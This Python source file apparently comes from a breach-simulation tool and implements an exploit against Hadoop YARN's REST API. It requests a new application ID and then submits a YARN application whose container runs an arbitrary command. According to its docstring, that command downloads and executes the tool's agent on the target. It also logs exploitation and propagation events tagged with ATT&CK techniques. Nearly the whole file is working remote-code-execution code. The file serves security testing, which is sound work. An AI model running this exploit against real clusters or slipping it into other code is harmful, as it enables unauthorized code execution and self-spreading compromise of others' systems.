import json
import logging
import posixpath
import string
from time import time
from typing import Tuple
from uuid import UUID

import requests

from common.agent_events import ExploitationEvent, PropagationEvent
from common.event_queue import IAgentEventPublisher
from common.tags import (
    T1105_ATTACK_TECHNIQUE_TAG,
    T1203_ATTACK_TECHNIQUE_TAG,
    T1210_ATTACK_TECHNIQUE_TAG,
)
from common.types import Event
from common.utils.code_utils import insecure_generate_random_string
from infection_monkey.model import TargetHost

from .hadoop_options import HadoopOptions

logger = logging.getLogger(__name__)
HADOOP_EXPLOITER_TAG = "hadoop-exploiter"


class HadoopExploitClient:
    """
    Exploits Hadoop by submitting a new application to YARN. That application executes a custom
    command to download and execute the Agent.
    """

    _EXPLOITED_SERVICE = "Hadoop"
    NAME = "HadoopExploiter"
    # Random string's length that's used for creating unique app name
    RAN_STR_LEN = 6

    _EXPLOITER_TAGS = (HADOOP_EXPLOITER_TAG, T1203_ATTACK_TECHNIQUE_TAG, T1210_ATTACK_TECHNIQUE_TAG)
    _PROPAGATION_TAGS = (HADOOP_EXPLOITER_TAG, T1105_ATTACK_TECHNIQUE_TAG)

    def __init__(
        self,
        agent_id: UUID,
        agent_event_publisher: IAgentEventPublisher,
    ):
        self._agent_id = agent_id
        self._agent_event_publisher = agent_event_publisher

    def exploit(
        self,
        target_host: TargetHost,
        options: HadoopOptions,
        interrupt: Event,
        url: str,
        command: str,
    ) -> bool:
        """
        A reference to a method which implements web exploit logic.

        :param url: Url to send malicious packet to. Format: [http/https]://ip:port/extension.
        :param command: Command which will be executed on remote host
        :return: RCE's output/True if successful or False if failed
        """
        try:
            # Get the newly created application id
            logger.info("Apply for new Hadoop application")
            timestamp = time()
            resp = requests.post(
                posixpath.join(url, "ws/v1/cluster/apps/new-application"),
                timeout=options.request_timeout,
            )
            resp_dict = json.loads(resp.content)
            app_id = resp_dict["application-id"]

            # Create a random name for our application in YARN
            # Avoid the risk of blocking by using insecure_generate_random_string()
            rand_name = options.yarn_application_suffix + insecure_generate_random_string(
                n=self.RAN_STR_LEN, character_set=string.ascii_lowercase
            )
            logger.info("Building Hadoop exploit payload")
            payload = HadoopExploitClient._build_payload(app_id, rand_name, command)

            if interrupt.is_set():
                return False

            logger.info(f"Sending Hadoop exploit payload to host: {target_host.ip}")
            timestamp = time()
            resp = requests.post(
                posixpath.join(url, "ws/v1/cluster/apps/"),
                json=payload,
                timeout=options.request_timeout,
            )

            success = resp.status_code == 202
        except requests.ConnectionError:
            success = False

        message = "" if success else f"Failed to exploit via {url}"
        self._publish_exploitation_event(target_host, timestamp, success, error_message=message)
        self._publish_propagation_event(target_host, timestamp, success, error_message=message)
        return success

    @staticmethod
    def _build_payload(app_id, name, command):
        payload = {
            "application-id": app_id,
            "application-name": name,
            "am-container-spec": {
                "commands": {
                    "command": command,
                }
            },
            "application-type": "YARN",
        }
        return payload

    def _publish_exploitation_event(
        self,
        target_host: TargetHost,
        time: float = time(),
        success: bool = False,
        tags: Tuple[str, ...] = tuple(),
        error_message: str = "",
    ):
        exploitation_event = ExploitationEvent(
            source=self._agent_id,
            target=target_host.ip,
            success=success,
            exploiter_name=self.NAME,
            error_message=error_message,
            timestamp=time,
            tags=frozenset(tags or self._EXPLOITER_TAGS),
        )
        self._agent_event_publisher.publish(exploitation_event)

    def _publish_propagation_event(
        self,
        target_host: TargetHost,
        time: float = time(),
        success: bool = False,
        tags: Tuple[str, ...] = tuple(),
        error_message: str = "",
    ):
        propagation_event = PropagationEvent(
            source=self._agent_id,
            target=target_host.ip,
            success=success,
            exploiter_name=self.NAME,
            error_message=error_message,
            timestamp=time,
            tags=frozenset(tags or self._PROPAGATION_TAGS),
        )
        self._agent_event_publisher.publish(propagation_event)
